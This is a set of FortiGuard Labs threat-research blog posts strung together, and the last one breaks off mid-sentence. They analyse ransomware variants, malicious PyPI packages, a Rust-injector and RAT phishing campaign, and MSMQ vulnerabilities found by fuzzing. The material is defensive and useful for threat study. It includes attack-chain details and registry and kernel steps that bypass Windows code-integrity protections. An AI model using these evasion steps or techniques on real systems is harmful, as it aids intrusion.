    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers Trash Panda and a new minor variant of the NoCry ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Trash Panda is a ransomware that runs on the Windows platform that was first spotted in early August. It encrypts files on compromised machines, replaces the desktop wallpaper, and drops a ransom note that includes politically themed messages. Information about the infection vector used by the Trash Panda ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. Trash Panda ransomware samples have been submitted to a public file scanning service from the following countries: Once the Trash Panda ransomware is executed, it launches a Command Prompt that clearly states that it’s encrypting files. It encrypts files on the compromised machineexceptfor files with the following file extensions: .diagcab, .cpl, .mod, .bat, .nls, .ldf, .dll, .ps1, .adv, .prf .idx,.rtp, .ocx, .icl, .ani, .cab, .rom, .key, .wpx, .icns, .themepack, .msc, .msp, .cur, .theme, .cmd, .diagpkg, .lnk, .ico, .drv, .bin, .nomedia, .lock, .mpa, .hlp, .scr, .shs, .com, .ics, .hta, .msi, .exe, .diagcfg, .msu, .deskthe, .mepack, .386, .msstyles, .spl, .sys The ransomware adds a “.monochromebear” extension to the files it encrypts. While no definitive conclusion can be made, the following message included in the ransom note provides a clue as to the possible origin of the Trash Panda ransomware and the country it targets: The ransomware also replaces the desktop wallpaper, which asks victims to check the dropped readme file. NoCry is a ransomware designed for the Windows platform that was first discovered in April 2021. NoCry ransomware variants are generated by NoCry ransomware builders and sold on the group’s Telegram channel. It appears that this NoCry ransomware variant was hosted on a website with a URL containing the name of a private bank in India as a string ([bank’s name]-india[.]github[.]io/Start[.]exe), so we believe that the threat actor used the bank as bait or to make the file look legitimate. The NoCry ransomware variant was submitted to a public file scanning service from the following locations: Once executed, this NoCry ransomware variant encrypts files on the compromised machines, adds a \".rcry\" extension to the encrypted files, and displays a ransom note. An interesting aspect of this ransomware is that it specifies USDT-TRC20 as the ransom payment. USDT-TRC20 is a stablecoin issued by Tether on the TRON network. It is pegged to the U.S. dollar and designed so that one USDT is approximately equal to one USD. The Bitly link in the ransom note leads to a Web page of a purported cybersecurity company based in California that offers services such as data encryption, malware removal, and firewalls with pricing plans. The Web site was created using a website builder called “Pineapple Builder.” The Pineapple badge at the bottom right of the Web site indicates that it was created using the free version. To use the services offered by this company, users must pay the fee in the same cryptocurrency to the same address specified by this ransomware. While we cannot say with certainty, it seems likely that the ransomware threat actor fabricated this company or website to collect additional money from users. This also indicates that the group uses multiple traps to increase the financial success of their attack. According to Tronscan (tronscan[.]org), the attacker’s wallet has received a few transactions. Since all incoming transactions have been less than 50 USDT, however, it's safe to assume that neither the NoCry ransomware variant nor the related fake service had successfully victimized anyone at the time of writing. The ransomware also drops a separate ransom note in an HTML file labeled “How to Decrypt My Files.html.” Fortinet customers are already protected from these malware variants through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Trash Panda ransomware sample with the following AV signature: FortiGuard Labs detects the NoCry ransomware variant with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. The FortiGuard Web Filtering Service blocks the NoCry ransomware distribution site and the associated potential scam site.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises).

    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-ai-detects-malicious-packages-in-pypi",
    "content": "FortiGuard Labs Threat Research Python Package Index (PyPI) packages have become a common way for threat actors to post malware that unsuspecting victims may download. The FortiGuard Labs team has been monitoring this attack vector for some time and, earlier this year, began posting a monthly update of the malicious packages we have discovered. Recently, we introduced a new AI engine to our OSS supply chain threats hunting system. We have already discovered several new malicious PyPI attacks using this AI engine assistant. A little preview of our AI engine detection is shown below. This report looks at two sets of malicious PyPI packages published in early July. We have bundled them together by author to demonstrate how it is common for the same author to release several similar or even identical malicious packages using different PyPI account IDs. For example, the packages in the first set were written by a threat actor who goes by the handle Josef M and uses the email address “johannes.mayer@yahoo.com.” The second set was written by an author with the PyPI ID “killskids.” These packages all had a similar project page style, as shown below: Let’s look at one of the packages, “syssqlitedmodules.” The first thing we notice in its __init__.py is a long string of encrypted code that will be run. After decryption, we can see this is a stealer malware, similar to the one we analyzed in aprevious blog. Using a Discord webhook, it tries to steal information, such as credit cards, wallets, account logins, etc. The setup.py in these packages tries to use cmdclass commands that may run when installing the package, as shown below. We can see that this setup.py tries to connect to a URL to download a potentially malicious executable file and run it. However, the payload for this package was unavailable at the time of our writing. This blog shows that the same author often uses different PyPI IDs when posting their malicious packages. This is likely an attempt to spread their malware as much as possible before it is taken down. Using similar code for each package is a quick and easy way for malware authors to distribute malware quickly while increasing its shelf life. Discovering new OSS threats hidden in millions of packages is like looking for a needle in a haystack. Our new AI engine can work far better than traditional approaches, discovering threats in near real-time to protect organizations from malicious threat actors lying in wait.

    "title": "Attackers Distribute Malware via Freeze.rs And SYK Crypter",
    "link": "https://www.fortinet.com/blog/threat-research/malware-distributed-via-freezers-and-syk-crypter",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Controls victim’s device and collects sensitive informationSeverity level:Critical FortiGuard Labs recently detected a new injector written in Rust—one of the fastest-growing programming languages—to inject shellcode and introduce XWorm into a victim’s environment. While Rust is relatively uncommon in malware development, several campaigns have adopted this language since 2019, includingBuer loader,Hive, and RansomExx. FortiGuard Labs analysis also revealed a significant increase in injector activity during May 2023, where the shellcode can be encoded with Base64 and can choose from encryption algorithms such as AES, RC4, or LZMA to evade antivirus detection. By examining the encoded algorithms and API names, we identified the origin of this new injector in the Red Team tool “Freeze.rs,” designed to create payloads able to bypass EDR security controls. Additionally, during our analysis of the attack, we discovered that SYK Crypter—a tool commonly used to deliver malware families via the community chat Discord—was involved in loading Remcos, a sophisticated remote access Trojan (RAT) that can be used to control and monitor devices running Windows. SYK Crypter emerged in 2022 and has been used by various malware families, including AsyncRAT, njRAT, QuasarRAT, WarzoneRAT, and NanoCore RAT. FortiGuard Labs observed phishing email activity on July 13 that initiated an attack chain using a malicious PDF file. This file redirects to an HTML file and utilizes the “search-ms” protocol to access an LNK file on a remote server. Upon clicking the LNK file, a PowerShell script executes Freeze.rs and SYK Crypter for further offensive actions. Eventually, XWorm and Remcos are loaded, and communication with the C2 server is established. In this article, we will delve into the initial attack method employed to deliver the Rust-lang injector, SYK Crypter, and further explore the subsequent stages of the attack. The phishing email, displayed in Figure 1, masquerades as an urgent order supplement request sent to various companies to deceive the recipient. It also employs a blurred image in the PDF file to entice the victim to click a concealed button. The attached PDF file is shown in Figure 2. The malicious URL was hidden in a stream object (/ObjStm), making it challenging to detect. However, extracting the URL by pdf-parser reveals that it is located in object 14 within stream object 1, as shown in Figure 3. Upon clicking the file, the victim connects to the URL https://www[.]cttuae[.]com/ems/page[.]html, a website that seemingly offers travel services. The attacker had uploaded a malicious HTML file to the “ems” path on July 12, with the source code displayed in Figure 4. Instead of directly downloading a virus, the attacker adopts a more sophisticated approach by utilizing the “search-ms” protocol to trigger a search result. Specifically, they search for “ORDER_SPEC0723” on a remote cloud storage server facilitated by DriveHQ. Notably, the file “ORDER_PSEC0723” masquerades as a PDF file icon, but upon closer inspection, it is revealed to be an LNK file that executes a PowerShell script within the same folder, as shown in Figure 5. This tactic allows the attacker to initiate their malicious activities discreetly. The PowerShell script “pf.ps1” (Figure 6) is then executed, beginning with the use of “regsvr32” to launch the injector “doc.dll,” which was written in Rust. It opens the decoy PDF file “T.pdf” and executes “AA.exe.” Finally, all File Explorer windows are closed using “Stop-Process -Force.” The PDF file “T.pdf” in Figure 7 appears clean and contains clear text, intending to distract the victim from other malicious actions. The following section will look in detail at “doc.dll” and “AA.exe.” Figure 8 reveals that the injector was written in the Rust programming language, based on the string section analysis. The injection process begins with creating a “notepad.exe” process using CreateProcessA. The shellcode is subsequently obtained through Base64 decoding and LZMA decompression. The injector then injects the shellcode using functions directly with the NTAPI library. This entire process mirrors the behavior of the Red Team tool “Freeze.rs” which was launched in May, showing rapid adoption of this new tool.” The source code and injector’s assembly code showcased in Figure 9. Over the past month, we’ve compiled a collection of diverse Rust injectors, including DLL files with LZMA-compressed shellcode, DLL files featuring RC4-encrypted shellcode, and EXE files incorporating RC4-encrypted shellcode. The shellcode data within these injectors are all encoded using Base64, and intriguingly, the file type and encryption algorithm appear to be selectable options within the program. This observation aligns seamlessly with the options found in the “Freeze.rs” repository, suggesting a potential connection to this Red Team tool. The flexibility in choosing encryption methods and file types adds to the sophistication of these injectors, further complicating detection and analysis for security researchers. When utilizing the RC4 algorithm variant, the key is expanded to 256 bytes and used in the Pseudo-Random Generation Algorithm (PRGA). The corresponding source code and assembly for this injector variant can be seen in Figure 11. Upon comparison, it becomes evident that this attacker employs “Freeze.rs” to bypass EDRs and utilizes suspended processes. The decrypted shellcode can be found at address 0x650000, as shown in Figure 12. The decrypted shellcode applies AMSI bypass and WDLP bypass techniques, subsequently executing a .NET payload. Once executed, the .NET assembly can be dumped from memory address 0x1AAB6E70, as depicted in Figure 13, allowing for analysis as a stand-alone .NET executable. The .NET payload discovered in the process is known as XWorm, a commodity RAT tool reportedly traded in underground forums. XWorm is equipped with typical RAT functionalities, including gathering machine information, capturing screenshots, logging keystrokes, and establishing control over compromised devices. In this instance, the XWorm payload version is v3.1, and the C2 server information remains hidden on the “pastebin.com” website, as illustrated in Figure 14. The execution file, “AA.exe,” operates as an MSIL downloader and has two links embedded: “95[.]214[.]27[.]17/storage/NAR” and “plunder[.]ddnsguru[.]com/storage/NAR”. Upon download completion, “AA.exe” utilizes the file name “760” as the decoding key and performs a subtraction operation with each byte in the downloaded data. The decoded data is a SYK Crypter with a resource named \"SYKSBIKO,\" which contains the encrypted payload. The DLL file checks to ensure the environment is not in debug mode and then proceeds with processing the resource data by employing RC4 decryption with the key “gOhgyzyDebuggerDisplayAttributei.” It invokes a small .NET code, \"Zlas1,\" for further deflation. To evade detection, SYK Crypter encoded the strings utilized in its execution flow, with the decoding function depicted in Figure 17. Additionally, it employs functions like “GetProcessesByName,” “Directory.Exists,” and “File.Exists” to assess the presence of security appliances within the compromised environment. The list used for checking is found in Figure 18. For persistence, the malware appends the “.exe” extension to the file “AA” and copies the MSIL downloader to the “Startup” folder. It also adds a registry entry “Run” at “HCKU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows.” The corresponding code is depicted in Figures 19 and 20. After RC4 decryption and deflation of the resource data “SYKSBIKO.Properties.Resources.resources‎‎.a,” the execution file is obtained, as shown in Figure 21. SYK Crypter then loads a Base64 .NET code and calls its “GetDelegateForFunctionPointer” function, creating delegation to all APIs from kernel32  or ntdll in the same method. Figure 22 shows a snippet loading “kernel32!WriteProcessMemory,” following which the decrypted payload is injected into a process. The injected payload is the Remcos RAT, originally designed as a legitimate tool for remote computer control. However, since its release in 2016, hackers have exploited it to gain control over victims’ devices. The configuration can be obtained by RC4 decrypting the “SETTINGS” resource, with the clear configuration displayed in Figure 24. Interestingly, the C2 server IP address remains the same as the XWorm payload’s. The combination of XWorm and Remcos creates a formidable trojan with an array of malicious functionalities. The C2 server's traffic report, as shown in Figure 25, reveals Europe and North America as the primary targets of this malicious campaign. As part of their strategy, the phishing campaign utilizes a PDF stream object and leverages the \"search-ms\" feature to entice unsuspecting victims. To further evade detection, threat actors adeptly use the Rust injector \"Freeze.rs\" and the MSIL file \"SYK Crypter.\" In this blog, we delved into the attack methodology employed through phishing emails and examined the various files involved in deceiving victims. Moreover, we provide a comprehensive overview of the functionalities within Freeze.rs and detail the workings of SYK Crypter.

    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-threat-report-key-findings-1h-2023",
    "content": "FortiGuard Labs Threat Research In our1H 2023 Threat Landscape Report, we examine the cyberthreat landscape over the year’s first half to identify trends and share insights with security professionals, enabling them to enhance their security strategies and better prioritize patching efforts. The report findings reflect the collective intelligence of FortiGuard Labs, drawn from Fortinet's vast array of sensors that collect billions of threat events observed worldwide during this same period. Below are key takeaways from the report. In the year's first half, we observed significant activity amongadvanced persistent threat (APT)groups, a rise in ransomware frequency and complexity, increased botnet activity, and much more. And while attack volume isn’t entirely on the continual upward climb we've seen in the past, we’re witnessing breach attempts become more sophisticated and targeted. As cybercriminals continue to advance their tactics, the good news for security practitioners is that much of the malicious activity observed is familiar, giving leaders and their teams ample opportunities to implement effective defense strategies. While ransomware has existed for decades, we’ve witnessed threat actors using more-sophisticated and complex strains in recent years to infiltrate networks, largely thanks to the expansion ofRansomware-as-a-Service (RaaS) operations. Ransomware volume certainly isn't slowing down, either, with ransomware activity ending 13 times higher at the end of 1H 2023 compared to the start of the year. Yet the number of enterprises detecting ransomware on their respective networks is declining: 13% in 1H 2023 compared to nearly 25% five years ago. Unfortunately, this isn’t cause for celebration, as it indicates bad actors carrying out more targeted attacks using highly adaptable playbooks. In several previous reports, we discussed wiper malware, a highly destructive attack technique that \"wipes\" data from infected systems. While we observed asurge in wiper use in early 2022, mainly in conjunction with the Russian-Ukrainian conflict, wiper malware attacks slowed in the first half of 2023. Since its inception, Fortinet has been a core contributor to exploitation activity data supporting theExploit Prediction Scoring System (EPSS). Many vulnerability management teams use EPSS to help prioritize their remediation efforts. But EPSS can also help us track the progression of vulnerabilities from initial disclosure to the outbreak of exploitation in the wild. Our latest report analyzed six years of data spanning more than 11,000 published vulnerabilities for which our sensors detected exploitation. We sought to determine how long it takes for a vulnerability to move from initial release to exploitation, whether vulnerabilities with a high EPSS score get exploited faster, and whether we could predict the average time-to-exploitation using EPSS data. Our analysis shows that the top most exploitable vulnerabilities, as identified by EPSS, are 327 times more likely to be attacked within a week than others on your radar. Using EPSS data in this way can serve as an early warning system. For the first time in the history of our Global Threat Landscape Report, we tracked the number ofactive APT groups. Our research shows that of the 138 cyberthreat groups identified by MITRE, 41 (30%) were active during the first half of the year. Based on our malware detections, Turla, StrongPity, Winnti, OceanLotus, and WildNeutron were the most active. Yet over the past six months, APT-led threats impacted only a small subset of all organizations, indicating that APT endeavors remain highly targeted… at least for now. In this year’s report, we examined longer-term trends regarding unique exploits, malware variants, and botnet activity to give us a greater perspective on today's threat landscape. Our data shows that the count of unique exploit detections is up 68% over the past five years—a sign that attackers are multiplying and diversifying their exploits. However, we also observed a 75% drop in exploitation attempts per organization and a 10% dip in severe exploits, both of which signal that cybercriminals increasingly carry out more-targeted attacks. Malware families and variants have exploded over the past five years, up 135% and 175%, respectively. We also observed more active botnets (+27%) and a higher incidence rate of botnet infection among organizations (+126%). What’s most concerning about botnets is that they have become more persistent over this period, spending more time “lingering” on networks before they’re detected and blocked. Threat actors won’t be slowing down anytime soon, particularly as organized cybercrime groups make it even easier for them to achieve a quick payday. However, there are numerous actions organizations can take today to better protect their networks from these adversaries. Sharing and utilizing threat intelligence has never been more important to combat the ever-increasing sophistication and volume of cyberthreats. Additionally, understanding attack flows—from initial entry points to post-exploitation activities—is vital to creating effective cybersecurity strategies. Finally, there’s no better time to implement new security technologies and reassess your team's processes and playbooks. Developing and maintaining a comprehensive defense strategy is crucial to protecting enterprise networks today and in the future. Our latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet’s vast array of sensors that collect billions of threat events observed worldwide during the first half of this year.

The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the DoDo and Proton ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryption and not to leak stolen filesSeverity level:High DoDo ransomware was first reported in February this year. It is a variant of the widely reported and observed Chaos ransomware. Because it is a derivative, the DoDo ransomware is not considered to be a new and recent ransomware. However, a slightly different version of the DoDo ransomware has recently emerged that we describe below. DoDo ransomware samples have the “Mercurial Grabber” file icon, which indicates the ransomware was likely distributed as such. Mercurial Grabber is an open-source malware builder that can generate an infostealer configured to steal information such as Discord tokens, machine information, Windows product keys, and Chrome passwords from victims’ machines. It wasposted on GitHubon June 3, 2021, with the following disclaimer: However, threat actors have been actively using this builder to target victims and steal information by using the built-in functions shown in Figure 2, below. The latest DoDo ransomware samples have been submitted to a public file scanning service from the following countries: Older variants were submitted from the following countries: The masquerading of free apps and tools is a classically simple yet effective attack vector used by cybercriminals for years. However, in this case, the DoDo ransomware is masquerading as the nefarious Mercurial Grabber application, which means that the most likely potential victims are either malicious attackers or curious users. This also makes the abundance of submission sources rather surprising, indicating that users worldwide have all managed to somehow find and download a copy of the fake Mercurial Grabber builder. It is also important to note that the file icon can be easily changed. In other words, it can also impersonate other applications, which all users should be aware of when downloading and using apps off the internet. While the newer and older DoDo variants drop slightly different ransom notes and add different file extensions to encrypted files, they have two things in common: all DoDo ransomware samples were created using Chaos Builder version 3, which was released in mid-2021, and they all use the same Bitcoin address to receive ransom payments. Chaos ransomware Builder 3 has the disadvantage that it can only encrypt files smaller than 1 MB. Files larger than that are overwritten and considered unrecoverable unless backups remain intact. This really means that DoDo operates much like a wiper for larger files because the attacker cannot recover all of their files even if the ransom payment is made. The older DoDo ransomware variants dropped a ransomware note labeled “dodov2_readit.txt” and added a “.dodov2” extension to the encrypted files. The ransom demand is $15 worth of Bitcoin or Monero (XMR). In contrast, the recent DoDo ransomware samples drop a ransom note labeled “PLEASEREAD.txt,” add a “.crypterdodo” extension to the encrypted files, and replace the desktop wallpaper with the same ransom message. The ransom demand is still $15 worth of Bitcoin or Monero (XMR). The attacker has also included a contact email address, likely for better “customer” service. In addition, the Monero address is different from the older variants. The Bitcoin address used by the DoDo ransomware has had more than 40 transactions since May 2022. However, most incoming transactions were under $10, raising questions as to whether they were ransom payments. The Monero addresses were not available at the time of our investigation. Proton is a recently reported ransomware designed to encrypt files on the Windows platform and demand ransom payments from victims to recover their affected files. Information on the infection vector used by the Proton ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. Proton ransomware samples were submitted to a public file scanning service from the following locations: While there is no indication that the Proton ransomware is widespread, this list shows that attackers have the means to distribute ransomware in different parts of the world. Once executed, the Proton ransomware encrypts files on victims’ machines and adds a “.[the attacker’s contact email address].Proton” extension to the affected files. It also changes the file icon of the encrypted files and drops a ransom note labeled “#[Unique ID assigned to each victim].txt” while replacing the victim’s desktop wallpaper. The Proton ransomware has several minor variants, most adding different contact email addresses as part of the file extensions added to the encrypted files. Below is a list of the contact addresses that the attacker has included in the ransom notes: During our research, FortiGuard Labs came across what appears to be the earliest sample of the Proton ransomware (SHA2: f36dda3b97266a6a30d905c73e1f8a45c4b6681e81fb2f8f59b622de899c4421), which was released in late March 2023. While the ransom note calls itself \"Proton,\" it does not use a \".Proton\" file extension. Instead, the sample uses \"Kigatsu@[redacted][victim's unique ID].kigatsu\". The ransom note includes the attacker’s Telegram ID, which is not seen in the recent ransom notes. As shown below, this variant does not replace the file icon of the encrypted files with the unique Proton logo. Another Proton ransomware variant was submitted to a public file scanning service in late June. This variant (SHA2: 3a86c8c0e96ef1984177c41c87dec40fe0df3fe71b8ef951063312010c86c9bb) uses a similar email address and the same Telegram ID as the oldest Proton ransomware sample but adds \".[attacker's email address].Proton\" to encrypted files and also changes their file icon. Based on these observations, we believe that the attacker has made some effort to improve the operation of this ransomware since its inception. Fortinet customers are already protected from this malware variant through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects known DoDo ransomware variants with the following AV signatures: FortiGuard Labs detects known Proton ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "title": "FortiGuard Labs Discovers Multiple Vulnerabilities in Microsoft Message Queuing Service",
    "link": "https://www.fortinet.com/blog/threat-research/microsoft-message-queuing-service-vulnerabilities",
    "content": "FortiGuard Labs Threat Research Over the last few months, FortiGuard Labs has discovered and reported multiple vulnerabilities found in the Microsoft Message Queuing (MSMQ) service. Microsoft patched these vulnerabilities in the April and July 2023 security updates. These patches are rated as critical/important, and as always, we urge users to install them as soon as possible. Affected platforms:WindowsImpacted parties:Microsoft Windows users with Microsoft Message Queuing service installedImpact:Remote code execution and denial-of-serviceSeverity level:Critical and Important In this post, we will walk through the attack surfaces of MSMQ, the approaches we took to tackle the challenges we encountered during fuzzing, and finally, we will provide details of the vulnerabilities. MSMQ is a proprietary messaging protocol developed by Microsoft that allows applications running on separate computers to communicate in a failsafe manner. MSMQ ensures reliable delivery by placing messages that fail to reach their intended destination in a queue and then resending them once the destination is reachable. RabbitMQ is an open-source messaging queuing protocol similar to MSMQ. The MSMQ service is hosted as a standalone Windows service under MQSVC.EXE. The MSMQ operation is implemented in both user-mode and kernel-mode components, namely MQQM.DLL and MQAC.SYS. As shown in Table 1, MQQM.DLL exposes TCP/IP and Remote Procedure Calls (RPC) ports allowing applications to interact with the service via the network. Based on the open ports being used, we determined that most of the potential attack surfaces are reachable remotely by adversaries. In other words, any security vulnerability discovered from these identified attack surfaces could have a severe security impact, from remote Denial of Service (DoS) to remote code execution. As a result, we uncovered three security issues reachable through port 1801, which were caused by message header parser routines implemented in MQQM.DLL. However, our attempts to identify security issues through the RPC interface have yet to yield results. Fuzzing the message header parser is straightforward, as the message header parser operates in multiple threads and thus can handle concurrent messages independently. Furthermore, there is no global state that will affect the fuzz result when the fuzzer sends crafted packets to the target. However, the challenge is that the target is running on a remote service process, and we need to monitor the target service process when it crashes. When the crash happens, a manual process restart is required as the Windows automatic service restart is not persistent. This is necessary to ensure a persistent fuzzing operation that can run continuously. Injecting DLL into the Windows Service process used to be relatively straightforward on older versions of Windows, such as Windows 7, before protected process light (PPL) and control guard were introduced. Various control guards have been deployed on critical Windows processes, such as Windows services, since Windows 10. In particular, Code Integrity Guard (CIG), which requires binaries to be signed by Microsoft if they run on Windows-protected processes, and Application Control Guard (ACG), which controls the host application's behavior according to mitigation policies.  In our case, we were greeted with the message shown in Figure 1 when we injected our custom unsigned DLL into SERVICES.EXE. According to the error message, when User-Mode Code Integrity (UMCI) is enforced, untrusted binaries cannot be executed or loaded into the protected process. While a UMCI exclusions path is partially documented by Microsoft, following the suggested registry key modification does not immediately enable us to run an unsigned DLL in the service host process. After some reverse engineering on the code integrity module, namely CI.DLL, we concluded that the following requirements need to be satisfied to work around the UMCI checks: 1. Enable UMCI path exclusions. The following example adds an exclusion for \"\\tools\" Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\TRSData]\"TestPath\"=hex(7):5C,00,74,00,6f,00,6f,00,6c,00,73,00,00,00,00,00 2. Enable UMCI audit mode. Add the following REG_DWORD Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\CI]“UMCIAuditMode” = dword:00000001 3.CI!g_CiDeveloperMode|2bitmask must be set beforeCI!CiInitializePolicyfunction exits 4. Unset the PsProtectedLight flag on the target process via EPROCESS.Protection 5. Unset the DisableDynamicCode and AuditDisableDynamicCode flags on the target process via EPROCESS.MitigationFlagsValues An astute reader should realize that steps 3 – 5 require real-time modification of some data in the kernel-module data structure. However, it is trivial to achieve if you have a Windows kernel debugger attached to the target OS. After that, the custom DLL can install a hook on the service host process to monitor process creation and process termination operations. For our use case, the custom DLL uses the Windows debugger API to capture exceptions/crashes for our target service process, MQSVC.EXE. The code snippet for the main debugger thread is shown in Figure 3. At the same time, we also wanted to attach a debugger to the service process before it starts to execute. This is very helpful in reverse engineering if you want complete control over the target process before it starts to execute any code. On top of that, we can also use the Windows Time-Travel-Debugger (TTD), tttracer.exe, to capture the complete trace of the target service process, which is helpful for crash triaging. Figure 4 shows the code snippet of the hook function in the custom DLL that will delay the execution of the target process when it is spawned by services.exe. Network protocol fuzzing is more effective if we send well-crafted packets to the target. Fortunately, MSMQ specifications are publicly available, and most importantly, most of its message headers data structure is documented by Microsoft. This allows us to write a structure-aware fuzzer that will mutate data according to its format and data type rather than generating random meaningless input data. Another critical component needed by our MSMQ fuzzer is a coverage-guided capability. TinyInst by Ivan Fratric is my first go-to binary instrumentation library for remote process fuzzing. Furthermore, the library is well-designed, making it easy to integrate into any custom fuzzer. Figure 5 shows the code snippet of the MSMQ fuzzer that attempts to generate a structured EodMessage header packet. A typical MSMQ packet must include headers, such as BaseHeader, UserHeader, and MessagePropertiesHeader. It may also include additional optional headers, like TransactionHeader, SecurityHeader, DebugHeader, SessionHeader, etc. As shown in Figure 6, the optional headers come after the mandated headers and are ordered sequentially. Our MSMQ fuzzer considers the order of the message headers to pass the sanity check of the message header parser. One of the RCE vulnerabilities is, in fact, caused by an unsanitized field in a particular message header data structure when the crafted packet is parsed by the message header parser. Because of how the message header parses the packets—looking for the headers sequentially—it will eventually trigger an out-of-bounds memory write. FortiGuard Labs provides vulnerability identification signatures toFortiDASTusers that can detect these vulnerabilities via an exploit engine module called the FortiDAST Scripting Engine (FSE). Some of the basic features of this exploit engine were introduced in a FortiGuardblogback in 2021. FortiDAST performs automated black-box dynamic application security testing of web applications to identify vulnerabilities that threat actors may exploit. FSE is an add-on to FortiDAST that enables the detection of CVE-specific vulnerabilities on networked assets not limited to web applications. When users configure the Exploit Engine (Figure 8), they will be asked to select the type of applications currently supported by FSE. In this case, we will demonstrate the ability of FortiDAST to detect assets that run the vulnerable Message Queuing service. Upon completing the scan, FortiDAST will show the result of FSE under the Exploit Engine dashboard, as shown in Figure 10: This next section reviews the vulnerabilities we discovered using the process described above along with related IPS signatures. This out-of-bounds read occurs because EodHeader, StreamIdSize, and OrderQueueSize are not validated before accessing them in the message header parser routine CQmPacket::CQmPacket. The message header parser routine has scrutinized most of the message header, but it turns out that the data structure for the header in question is not being validated. Based on our analysis, an information disclosure exploit seems implausible. However, a denial-of-service attack can be achieved when the out-of-bound read accesses an invalid address. FortiGuard Labs has released the IPS signatureMS.Windows.Message.Queuing.Service.CVE-2023-28302.DoSto detect this issue. This out-of-bounds write occurs because the message header parser, CQmPacket::CQmPacket, does not properly validate a message header with an arbitrary size. Some message headers, such as EodHeader, EodAckHeader, and CompoundMessageHeader, allow attackers to specify an arbitrary size/length that is not properly sanitized. As mentioned previously, the message headers are organized in sequential order. The message header parser will adjust the pointer according to the defined data structures for each specific message header. Since some message headers are not being validated, the pointer can be adjusted to point to an arbitrary location, an invalid address in this context, and potentially cause memory corruption when the pointer to the message header is dereferenced in the later part of the code. FortiGuard Labs has released the IPS 